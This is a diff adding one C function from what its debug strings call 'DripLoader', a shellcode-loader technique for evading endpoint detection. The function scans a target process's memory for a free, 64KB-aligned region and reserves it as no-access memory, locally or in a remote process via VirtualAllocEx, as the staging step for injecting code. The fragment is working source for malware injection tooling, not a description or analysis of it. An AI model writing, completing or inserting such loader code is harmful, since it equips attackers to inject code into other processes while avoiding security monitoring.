@@ -1,0 +1,63 @@
+void* AllocateExecutableMemory(HANDLE hTargetProcess, SIZE_T size) {
+    if (pfnNtQueryVirtualMemory == NULL) {
+        DEBUG_PRINT("DripLoader: NtQueryVirtualMemory not resolved!");
+        return NULL;
+    }
+
+    DEBUG_PRINT("DripLoader: Scanning for suitable base address...");
+
+    PVOID baseAddr = (PVOID)0;
+    MEMORY_BASIC_INFORMATION mbi;
+    PVOID currentAddr = (PVOID)0x10000; // Start skipping NULL page
+    
+    // Simple scan for a FREE region large enough
+    while ((ULONG_PTR)currentAddr < 0x7FFFFFFF0000) {
+        if (!NT_SUCCESS(pfnNtQueryVirtualMemory(hTargetProcess, currentAddr, 0, &mbi, sizeof(mbi), NULL))) {
+            break;
+        }
+        
+        if (mbi.State == MEM_FREE && mbi.RegionSize >= size) {
+            // Found a candidate
+            // Align to 64KB (Allocation Granularity) just in case
+            ULONG_PTR alignedBase = ((ULONG_PTR)mbi.BaseAddress + 0xFFFF) & ~0xFFFF;
+            if (mbi.RegionSize - (alignedBase - (ULONG_PTR)mbi.BaseAddress) >= size) {
+                baseAddr = (PVOID)alignedBase;
+                break;
+            }
+        }
+        
+        currentAddr = (PVOID)((ULONG_PTR)mbi.BaseAddress + mbi.RegionSize);
+    }
+
+    if (!baseAddr) {
+        DEBUG_PRINT("DripLoader: Could not find a free memory region of size %lu", size);
+        return NULL;
+    }
+
+    DEBUG_PRINT("DripLoader: Found base address at %p. Reserving as PAGE_NOACCESS...", baseAddr);
+
+    PVOID reservedMem = NULL;
+    
+    if (hTargetProcess == (HANDLE)-1) {
+        if (pfnVirtualAlloc) {
+            reservedMem = pfnVirtualAlloc(baseAddr, size, MEM_RESERVE, PAGE_NOACCESS);
+        }
+    } else {
+        #ifdef pfnVirtualAllocEx_DEFINED
+        if (pfnVirtualAllocEx) {
+            reservedMem = pfnVirtualAllocEx(hTargetProcess, baseAddr, size, MEM_RESERVE, PAGE_NOACCESS);
+        }
+        #else
+        if (pfnVirtualAllocEx) {
+             reservedMem = pfnVirtualAllocEx(hTargetProcess, baseAddr, size, MEM_RESERVE, PAGE_NOACCESS);
+        }
+        #endif
+    }
+
+    if (!reservedMem) {
+        DEBUG_PRINT("DripLoader: Failed to reserve memory!");
+        return NULL;
+    }
+
+    return reservedMem;
+}
